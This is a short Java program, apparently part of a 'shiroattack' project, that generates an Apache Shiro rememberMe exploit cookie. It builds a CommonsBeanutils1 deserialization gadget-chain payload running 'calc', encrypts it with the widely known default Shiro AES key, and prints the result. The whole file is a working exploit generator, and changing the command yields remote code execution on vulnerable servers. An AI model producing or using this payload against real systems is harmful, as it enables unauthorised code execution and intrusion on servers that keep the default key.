package com.gulvn.shiroattack;
import com.gulvn.CC6;
import com.gulvn.CommonsBeanutils1;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

public class Client0 {
    public static void main(String[] args) throws Exception {
//        byte[] payloads = new CommonsCollectionsShiro().getPayload("calc");
        byte[] payloads = new CommonsBeanutils1().genpayloadNoComparableComparator("calc");
        AesCipherService aes = new AesCipherService();
        byte[] key = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
        ByteSource ciphertext = aes.encrypt(payloads, key);
        System.out.printf(ciphertext.toString());

    }
}
